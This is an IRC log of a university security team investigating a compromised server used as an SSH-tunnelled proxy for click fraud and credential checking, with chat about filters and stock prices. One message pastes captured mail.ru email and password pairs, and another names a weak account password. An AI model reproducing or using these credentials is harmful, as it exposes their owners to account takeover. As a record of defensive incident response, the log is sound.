2015-02-27 11:43:45	jschipp	almost got this filtering working
2015-02-27 11:44:12	jazoff	:)
2015-02-27 11:46:13	jschipp	wildcards don't seem to work in the host field though :(
2015-02-27 11:46:49	jazoff	oh.. well it is just the two
2015-02-27 11:47:11	jazoff	amantadine and rimantadine
2015-02-27 11:51:50	jschipp	if ($hostname == 'amantadine.ncsa.uiuc.edu'or
2015-02-27 11:51:50	jschipp	          $hostname == 'rimantadine.ncsa.uiuc.edu')
2015-02-27 11:51:50	jschipp	          and $rawmsg contains_i 'milter' then {
2015-02-27 11:51:50	jschipp	          stop
2015-02-27 11:51:52	jschipp	        }
2015-02-27 11:51:57	jschipp	that works
2015-02-27 11:52:21	jazoff	cool
2015-02-27 11:56:08	jschipp	it's in effect, let me know if there any issues or if there are anymore you need
2015-02-27 11:57:49	jazoff	volume seems to have dropped quite a bit
2015-02-27 11:58:52	wraquel	we'll have to watch that in case they switch it to illinois.edu down the road.
2015-02-27 11:59:07	jazoff	well, we could just preemptively add it
2015-02-27 11:59:39	wraquel	Is there supposed to be a space in 'amantadine.ncsa.uiuc.edu'or
2015-02-27 12:00:22	wraquel	or is that just a copy/paste issue
2015-02-27 12:05:44	wraquel	So, is there a db that bro can use to identify EoL software? Sounds like an interesting project to start up.
2015-02-27 12:08:14	jschipp	I fixed that 
2015-02-27 12:08:31	jschipp	it still worked without it anyway
2015-02-27 12:10:00	wraquel	want to add the illinois.edu variants too just in case?
2015-02-27 12:16:19	jazoff	heh, looks like people got a little too excited about splunk
2015-02-27 12:16:27	wraquel	?
2015-02-27 12:16:30	wraquel	oh
2015-02-27 12:16:32	wraquel	stock
2015-02-27 12:16:41	wraquel	dropping again?
2015-02-27 12:17:05	jazoff	opened up after earnings at around 75, is now down for the day at 68.36
2015-02-27 12:17:57	jazoff	same thing happened for ANET, opened up big, then huge selloff undid most of the gai
2015-02-27 12:19:37	jazoff	a lot of tech/security companies have been going nuts lately.. fireeye, palo alto networks
2015-02-27 12:20:16	jazoff	some company called cyberark has doubled recently.. no idea what they even do
2015-02-27 12:23:22	jazoff	I dunno anything about bubbles, but some of this is insane
2015-02-27 12:28:51	wraquel	cyberark... sounds like data archiving.
2015-02-27 12:29:12	jazoff	"CyberArk Software, Ltd. develops, markets, and sells IT security software solutions that protect organizations from cyber attacks in the United States and internationally"
2015-02-27 12:29:33	wraquel	hmmm
2015-02-27 12:29:38	jazoff	never heard of them, right?
2015-02-27 12:30:03	wraquel	yep
2015-02-27 12:30:26	jazoff	http://en.wikipedia.org/wiki/CyberArk#Products
2015-02-27 12:30:49	wraquel	https://secure.marketwatch.com/story/cyberark-software-ltd-files-registration-statement-for-proposed-secondary-offering-2015-02-27
2015-02-27 12:31:49	jazoff	i get the whole "software is eating the world" thing
2015-02-27 12:37:18	jazoff	jschipp: looking good
2015-02-27 12:38:39	jschipp	time for food
2015-02-27 12:38:42	jschipp	yay
2015-02-27 12:39:27	wraquel	So....
2015-02-27 12:39:44	wraquel	Is it me, or does 141.142.226.10 have a crap ton of different browser versions coming from it?
2015-02-27 12:43:48	jazoff	odd
2015-02-27 12:43:50	wraquel	How come bro_software reports browsers I don't see in bro_inbound or outbound.
2015-02-27 12:45:04	jazoff	there is an internal too
2015-02-27 12:45:21	jazoff	can also check software.log
2015-02-27 12:45:24	wraquel	Or there.
2015-02-27 12:58:52	wraquel	This looks weird. right? https://splunk-sec.internal.ncsa.edu:8000/en-US/app/search/search?q=search%20sourcetype%3Dbro_outbound%20%22Windows%20NT%22%20src%3D141.142.226.10&sid=1425063480.3075&earliest=&latest=
2015-02-27 13:01:30	soehlert	because of the Windows NT/AppleWebKit thing? or the fact that chrome and safari are listed?
2015-02-27 13:01:39	wraquel	The urls
2015-02-27 13:01:50	wraquel	oh... nevermind.
2015-02-27 13:03:53	wraquel	Just some weird searches.
2015-02-27 13:04:39	soehlert	haha that is strange..
2015-02-27 13:05:49	wraquel	There's weird stuff coming out of 141.142.226.10
2015-02-27 13:22:37	jazoff	could be vms
2015-02-27 13:32:25	jschipp	jazoff: when is your next visit date?
2015-02-27 13:34:38	wraquel	https://splunk-sec.internal.ncsa.edu:8000/en-US/app/search/search?q=search%20sourcetype%3Dbro_outbound%20%22Windows%20NT%22%20src%3D141.142.226.10%20%7C%20stats%20count%20by%20user_agent&earliest=-7d%40w0&latest=%40w0&display.events.type=list&display.page.search.tab=statistics&display.general.type=statistics&display.statistics.sortColumn=count&display.statistics.sortDirection=desc&sid=1425065659.3100
2015-02-27 13:36:44	wraquel	That's ~50 different user agents from teh same IP
2015-02-27 13:37:14	soehlert	vm server might be the case. what is that subnet? 226 is here. it could be in 3003.
2015-02-27 13:43:21	wraquel	Yeah, leo systems.
2015-02-27 13:43:29	soehlert	ughhhhhhh
2015-02-27 13:43:42	soehlert	i was figuring, but too scared to put it out there
2015-02-27 13:50:04	jschipp	lol
2015-02-27 13:50:50	soehlert	so now the question is, why are server vms making those search queries? i'm assuming incompetance over something bad, but still..
2015-02-27 13:51:03	jazoff	jschipp: not sure, need to pick a week
2015-02-27 13:53:49	jazoff	wraquel: i don't see 50..  i just see 4
2015-02-27 13:54:00	jazoff	index=bro source=*software* 141.142.226.10 | top unparsed_version
2015-02-27 13:55:06	jazoff	was it possibly matching mroe than just .10 when you looked? .101 .102 etc?
2015-02-27 13:55:42	wraquel	How far back were you looking?
2015-02-27 13:56:04	jazoff	oh, just 1 day
2015-02-27 13:57:28	jazoff	https://splunk-sec.internal.ncsa.edu:8000/en-US/app/search/search?sid=1425067019.3139
2015-02-27 13:57:40	jazoff	er, that could be better
2015-02-27 14:00:10	wraquel	is bro conn in splunk now?
2015-02-27 14:00:13	jazoff	yes
2015-02-27 14:00:22	wraquel	awesome
2015-02-27 14:03:10	jazoff	ah, it did something odd a week ago
2015-02-27 14:03:18	jazoff	https://splunk-sec.internal.ncsa.edu:8000/en-US/app/search/search?sid=1425067357.3174
2015-02-27 14:04:23	jazoff	could also be a rogue access point
2015-02-27 14:04:42	jazoff	oh, it is a leo ip, hmm
2015-02-27 14:07:46	wraquel	A lot of incoming ssh traffic.
2015-02-27 14:08:06	wraquel	germany....
2015-02-27 14:08:09	jazoff	the user agents from staurday are all over the place
2015-02-27 14:08:14	jazoff	mobmail android
2015-02-27 14:08:44	wraquel	144.76.29.48
2015-02-27 14:10:36	jazoff	need to go to the archives.. splunk doesnt have that much http logs
2015-02-27 14:13:10	wraquel	144.76.92.204 too
2015-02-27 14:15:03	jazoff	fgrepping for all of 2015/02 on lowp for that ip from http*
2015-02-27 14:15:52	wraquel	78.46.73.71
2015-02-27 14:16:12	wraquel	and 188.40.120.149
2015-02-27 14:16:57	jazoff	wow, there is a lot of http
2015-02-27 14:17:18	wraquel	Those 4 ips are sshing into 141.142.226.10
2015-02-27 14:17:20	wraquel	A lot
2015-02-27 14:17:30	wraquel	well, collectively.
2015-02-27 14:17:59	wraquel	all from germany. Could potentially just be an NCSA employee. Weird traffic though.
2015-02-27 14:18:08	wraquel	and WAY too many user agents.
2015-02-27 14:18:16	jazoff	yeah
2015-02-27 14:18:55	jazoff	1.3G    141.142.226.10_http.txt
2015-02-27 14:19:10	jazoff	and it's only up to 2/12
2015-02-27 14:19:39	wraquel	nothing in gulp.
2015-02-27 14:19:48	jazoff	no syslog from taht host?
2015-02-27 14:20:04	wraquel	Nope
2015-02-27 14:20:10	wraquel	It's a leo machine.
2015-02-27 14:20:15	wraquel	I doubt we get any of that.
2015-02-27 14:20:23	soehlert	we do not
2015-02-27 14:20:37	wraquel	User responsible:	None
2015-02-27 14:20:49	wraquel	Hmmm DES
2015-02-27 14:21:06	soehlert	DES?
2015-02-27 14:21:14	wraquel	Network Description:NCSA Building 3003 DES
2015-02-27 14:21:29	soehlert	ooo nvm i see
2015-02-27 14:21:29	soehlert	ya this is why i hate leo machines. it makes the rest of the centers auditability seem amazing
2015-02-27 14:23:19	jazoff	yeah, something is bad here
2015-02-27 14:23:25	jazoff	i grepped for that mobmail thing
2015-02-27 14:23:26	wraquel	seoseo
2015-02-27 14:23:31	wraquel	er, just one of those.
2015-02-27 14:23:46	jazoff	/cgi-bin/auth?Login=britpopbitch@inbox.ru&Password=qwerty7000&mobile=1&simple=0&useragent=android
2015-02-27 14:23:49	jazoff	/cgi-bin/auth?Login=oerf3001@inbox.ru&Password=gannibal&mobile=1&simple=0&useragent=android
2015-02-27 14:23:50	soehlert	does seoseo get me twice the page hits?
2015-02-27 14:23:52	jazoff	/cgi-bin/auth?Login=kamikadze202@inbox.ru&Password=kamikadze&mobile=1&simple=0&useragent=android
2015-02-27 14:23:55	jazoff	/cgi-bin/auth?Login=stas010173@inbox.ru&Password=rcd1973&mobile=1&simple=0&useragent=android
2015-02-27 14:23:58	jazoff	/cgi-bin/auth?Login=loko160895@inbox.ru&Password=231167&mobile=1&simple=0&useragent=android
2015-02-27 14:24:02	jazoff	/cgi-bin/auth?Login=andy710@inbox.ru&Password=a14n06dy&mobile=1&simple=0&useragent=android
2015-02-27 14:24:05	jazoff	on auth.mail.ru
2015-02-27 14:24:06	wraquel	Well....
2015-02-27 14:24:07	jazoff	so, that box is hosed
2015-02-27 14:24:35	wraquel	I don't see any other services on it. I'm good with BHRing it.
2015-02-27 14:24:56	wraquel	I'll send a note to Todd Tomashek. I think he'll know who to contact for that system.
2015-02-27 14:27:48	jazoff	though the activity did stop over the weekend
2015-02-27 14:27:50	jazoff	is the ssh still going on?
2015-02-27 14:27:57	jazoff	ah, yeah
2015-02-27 14:28:11	wraquel	yep
2015-02-27 14:28:12	wraquel	today even.
2015-02-27 14:29:04	jazoff	bhred
2015-02-27 14:29:41	jazoff	5993753 http requests from that IP this month
2015-02-27 14:29:59	jazoff	definitely looks like proxy acitivity
2015-02-27 14:30:48	soehlert	hey what's bob's email? bregant2?
2015-02-27 14:30:58	wraquel	Yeah.....
2015-02-27 14:31:07	wraquel	His last day was a week ago.
2015-02-27 14:31:19	wraquel	But he should be getting email????
2015-02-27 14:31:35	wraquel	What did you need?
2015-02-27 14:31:38	soehlert	k thanks. wasnt sure since it's tagged "Robert Lynn Bregant III"
2015-02-27 14:31:38	soehlert	oh hell i thought i had more time, icepick said to get it to him before he left...
2015-02-27 14:31:38	soehlert	gah, who's in charge of duo now over there, anyone know?
2015-02-27 14:31:50	wraquel	uh
2015-02-27 14:31:56	jazoff	oh!
2015-02-27 14:31:59	jazoff	i have a duo admin login
2015-02-27 14:32:01	jazoff	i can fix you!
2015-02-27 14:32:03	wraquel	I guess it's justin.
2015-02-27 14:32:04	wraquel	:)
2015-02-27 14:32:06	soehlert	wooo 
2015-02-27 14:32:27	soehlert	self service works fine for never being in the system but does not appear to like my transferring phones thing
2015-02-27 14:32:40	jazoff	yeah, i fixed myself that way too
2015-02-27 14:32:48	jazoff	i guess there is still some need for a custom app
2015-02-27 14:33:16	soehlert	oh you had issues with it too?
2015-02-27 14:33:35	jazoff	yeah
2015-02-27 14:33:38	jazoff	i forget what my login is
2015-02-27 14:33:39	jazoff	sigh
2015-02-27 14:33:48	jazoff	resettng :)
2015-02-27 14:33:48	soehlert	haha password manager??
2015-02-27 14:34:07	jazoff	not saved for some reason
2015-02-27 14:34:38	jazoff	oh hm, was saved
2015-02-27 14:34:45	jazoff	just didnt give me the option to auto fill without right clicking
2015-02-27 14:34:54	soehlert	ah coo
2015-02-27 14:35:51	jazoff	so I delete your nexus 5?
2015-02-27 14:36:24	soehlert	yup
2015-02-27 14:36:29	soehlert	which i already did...interesting
2015-02-27 14:36:53	jazoff	ok, try now?
2015-02-27 14:36:57	jazoff	does it let you re-add it?
2015-02-27 14:37:08	soehlert	errr gotta go find that page again one sec
2015-02-27 14:37:21	jazoff	https://duo-user.opia.illinois.edu/
2015-02-27 14:37:59	soehlert	its only letting me sign up with a token now. no phone option
2015-02-27 14:39:04	jazoff	i added it back
2015-02-27 14:39:06	jazoff	did it just text you?
2015-02-27 14:39:30	soehlert	yup that worked
2015-02-27 14:39:42	soehlert	did you add my nexus 5 or 6? or does it even care?
2015-02-27 14:39:51	jazoff	didnt give me the optino
2015-02-27 14:39:54	jazoff	just picked android
2015-02-27 14:40:14	soehlert	ok cool thats fine. just didnt remember if wanted a model for any purposes like rsa
2015-02-27 14:40:15	jazoff	now it shows up as Motorola Nexus 6
2015-02-27 14:40:26	soehlert	must read something after activating the app
2015-02-27 14:49:29	wraquel	Just realized I haven't taken my blood pressure meds in a week.
2015-02-27 14:49:46	soehlert	that seems like a non ideal move to make
2015-02-27 14:52:53	jazoff	that box does look like clickfraud stuff
2015-02-27 14:53:00	jazoff	did a quick top across the hostnames in the http
2015-02-27 14:53:07	jazoff	80553 www.google-analytics.com
2015-02-27 14:53:07	jazoff	91930 ads.pubmatic.com
2015-02-27 14:53:07	jazoff	94862 b.scorecardresearch.com
2015-02-27 14:53:07	jazoff	116381 image2.pubmatic.com
2015-02-27 14:53:07	jazoff	123452 cm.g.doubleclick.net
2015-02-27 14:53:09	jazoff	144837 pthumbnails.5min.com
2015-02-27 14:53:12	jazoff	419270 ib.adnxs.com
2015-02-27 14:53:56	jazoff	unless that is actually normal amount of ad traffic
2015-02-27 14:54:04	soehlert	hah yes there does seem to be a trend there..
2015-02-27 14:54:21	jazoff	well lots of sites use google analytics and doubleclick
2015-02-27 14:54:45	jazoff	there's 23k requets for www.movietickets.com
2015-02-27 14:55:34	soehlert	right but the rest? and that many?
2015-02-27 14:58:30	wraquel	188.40.112.80 to 141.142.226.141
2015-02-27 15:04:28	jazoff	based on the outbound http i think it was compromised more than a week ago
2015-02-27 15:07:10	jazoff	2015-01-13 from DE
2015-02-27 15:11:57	soehlert	did anyone see verizons response to the net neutrality stuff?
2015-02-27 15:11:57	soehlert	apparently they wrote a letter in morse code dated 1934 to show how "antiquated" the idea of net neutrality is
2015-02-27 15:14:05	wraquel	... ..- -.-. -.- / .. - / ...- . .-. .. --.. --- -.
2015-02-27 15:14:30	soehlert	:)
2015-02-27 15:17:49	wraquel	I should type that out and put it on a carrier pigeon.
2015-02-27 15:18:00	soehlert	haha really beat em at their own game
2015-02-27 15:18:22	wraquel	Might be TOO modern though... http://en.wikipedia.org/wiki/IP_over_Avian_Carriers
2015-02-27 15:19:32	wraquel	Looks like I need to set aside some time to read. http://en.wikipedia.org/wiki/April_Fools%27_Day_Request_for_Comments
2015-02-27 15:20:07	soehlert	hahah holy crap. talk about a played out joke
2015-02-27 15:21:52	wraquel	hah https://tools.ietf.org/html/rfc7169
2015-02-27 15:22:01	wraquel	NSA (No Secrecy Afforded)
2015-02-27 15:24:17	wraquel	Todd's looking at the system right now..... Waiting in anticipation....
2015-02-27 15:24:26	jazoff	can you request them to syslog to us?
2015-02-27 15:24:38	wraquel	I'll request it.
2015-02-27 15:24:51	wraquel	I already mentioned it but he never responded to that specifically.
2015-02-27 15:25:02	jazoff	unless it is and the hostname is just different
2015-02-27 15:25:03	soehlert	ya they tend not to want to. leo convinced them its bad
2015-02-27 15:25:31	wraquel	This is Don's group right?
2015-02-27 15:25:56	jazoff	really need the new bro ssh analyzer.. the current heruristic based on is just not very helpful
2015-02-27 15:26:08	soehlert	ooo DES? ya maybe they'll be open to it
2015-02-27 15:26:32	wraquel	Apparently Don did security for some other gov site? ANL or something?
2015-02-27 15:26:44	soehlert	dunno. not sure who don is
2015-02-27 15:27:15	wraquel	The TALL dude that mumbles a lot and leads the DES group.
2015-02-27 15:27:23	jazoff	cause also.. WTF does an oracle server need world wide open ssh access
2015-02-27 15:27:27	soehlert	ahhh him
2015-02-27 15:28:13	wraquel	jazoff: AHEM... Cluster..... Oracle Cluster...
2015-02-27 15:28:34	wraquel	There are like 20 machines as part of that cluster.
2015-02-27 15:28:39	wraquel	And I think a few of them have ssh
2015-02-27 15:28:51	jazoff	yeah...
2015-02-27 15:28:59	jazoff	i can connect to 141.142.226.20:1521 from home
2015-02-27 15:29:17	jazoff	and .40.. and i imagine all of them
2015-02-27 15:29:57	wraquel	I think they need to ahve oracle access from other sites... I could be wrong, but I'm sure, after this, we can get Randy to have Don force a security review of their servers.
2015-02-27 15:30:23	jazoff	yeah.. "other sites" does not mean the whole internet :)
2015-02-27 15:30:29	soehlert	so ya. tunnels
2015-02-27 15:30:29	soehlert	or at least filter
2015-02-27 15:30:58	jazoff	cause as he says
2015-02-27 15:30:59	jazoff	"No one except me should have direct ssh to those IPs"
2015-02-27 15:31:10	jazoff	then WTF are there no controls in place to enforce this
2015-02-27 15:31:17	wraquel	This is my server. There are many like it, but this one is mine.
2015-02-27 15:43:12	jazoff	I wonder why 141.142.31.12 keeps setting off the udp DoS alert..
2015-02-27 15:43:27	jazoff	i added port 1900 recently and that is running something on that port that does it
2015-02-27 15:53:16	wraquel	Check this out
2015-02-27 15:53:16	wraquel	[root@node10-pb ~]# netstat -ntp| grep ssh
2015-02-27 15:53:16	wraquel	tcp 0 0 ::ffff:141.142.226.141:22 ::ffff:136.243.24.91:22270 ESTABLISHED 15057/sshd: tester 
2015-02-27 15:53:19	wraquel	tcp 0 0 ::ffff:141.142.226.141:22 ::ffff:188.40.112.80:29203 ESTABLISHED 25001/sshd: tester
2015-02-27 15:53:52	jazoff	tester is the user?
2015-02-27 15:54:30	wraquel	It look slike it
2015-02-27 15:55:31	wraquel	getting shell access to look around.
2015-02-27 15:55:32	jazoff	and GUESS what the password for that account is
2015-02-27 15:55:39	jazoff	i'll give you
2015-02-27 15:55:39	wraquel	tester
2015-02-27 15:55:40	jazoff	one guess
2015-02-27 15:55:45	jazoff	heh, test apparently
2015-02-27 15:55:50	wraquel	damn.
2015-02-27 15:55:51	wraquel	close
2015-02-27 15:55:52	jazoff	taking forever to open the session
2015-02-27 15:55:57	jazoff	but i got
2015-02-27 15:55:57	jazoff	debug1: Authentication succeeded (password).
2015-02-27 15:56:58	soehlert	:(
2015-02-27 15:57:31	jazoff	empty history on that account
2015-02-27 15:57:42	jazoff	odd
2015-02-27 15:57:46	wraquel	I think dns is disabled or something on that system. Thus the login delay.
2015-02-27 15:57:50	jazoff	eah
2015-02-27 15:57:59	wraquel	Makes sense if it's only used as a tunnel.
2015-02-27 15:57:59	jazoff	oh.. so wait..
2015-02-27 15:58:18	 *	jazoff tries to login to .20 using tester
2015-02-27 15:58:31	jazoff	well thankfully that failed
2015-02-27 15:58:49	jazoff	drwx------ 3 tester tester 4096 Jul 28  2013 /home/tester/
2015-02-27 15:58:55	jazoff	so that account has been around that long?
2015-02-27 15:58:56	jazoff	sigh
2015-02-27 16:02:22	jazoff	ah, 141.142.31.12 is running uTorrent
2015-02-27 16:02:32	jazoff	that is probably doing some uTP thing over port 1900
2015-02-27 16:06:55	wraquel	did you log in to .10 from .20?
2015-02-27 16:07:21	wraquel	Or is that someone else?
2015-02-27 16:07:24	jazoff	no, from fog
2015-02-27 16:10:03	wraquel	apparently it's todd
2015-02-27 16:35:58	wraquel	ok
2015-02-27 16:36:15	wraquel	added some notes to incident-reports. Going home.
2015-02-27 16:38:59	jazoff	added a webhook for the incident reports repo to notify #security.. hitting test now
2015-02-27 16:39:02	ncsabot	Justin Azoff pushed 3 commits to master in Incident Reports (https://git-sec.internal.ncsa.edu/ncsa-security/incident-reports/compare/39dd2aeab...458c3e91d)
2015-02-27 16:39:03	ncsabot	 * Adding 141.142.226.10 notes
2015-02-27 16:39:03	ncsabot	 * add uncommitted file
2015-02-27 16:39:03	ncsabot	 * chad-pc.ncsa.illinois.edu malware
2015-02-27 16:39:08	soehlert	sweet :)
2015-02-27 16:39:21	soehlert	though now ncsabot is posting git stuff here :)
2015-02-27 16:39:24	jazoff	i figure that is low volume enough that it can be sent here
2015-02-27 16:39:33	soehlert	ahhh ya fair enough
2015-02-27 16:39:56	soehlert	"2015-02-29"
2015-02-27 16:40:04	soehlert	impressive...that date doesn't exist haha
2015-02-27 16:41:11	jazoff	hah
2015-02-27 16:41:14	jazoff	where did you see that?
2015-02-27 16:41:22	soehlert	in the incident-reports repo
2015-02-27 16:41:27	soehlert	the dirname
2015-02-27 16:41:36	jazoff	oh
2015-02-27 16:41:40	jazoff	hah
2015-02-27 20:46:27	wraquel	whoops
2015-02-27 23:39:20	soehlert	hmmm, this may be something to look at long term...http://snipeitapp.com/
2015-02-27 23:39:26	soehlert	asset management.
2015-02-28 02:46:09	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-28 02:46:09	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-28 02:46:11	--	Mode #security [+]
2015-02-28 02:46:11	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-28 03:00:24	--	irc: disconnected from server
2015-02-28 03:00:56	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-28 03:00:56	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-28 03:00:58	--	Mode #security [+]
2015-02-28 03:00:58	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-28 03:01:48	--	irc: disconnected from server
2015-02-28 03:02:01	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-28 03:02:01	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-28 03:02:03	--	Mode #security [+]
2015-02-28 03:02:03	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-28 03:02:14	--	irc: disconnected from server
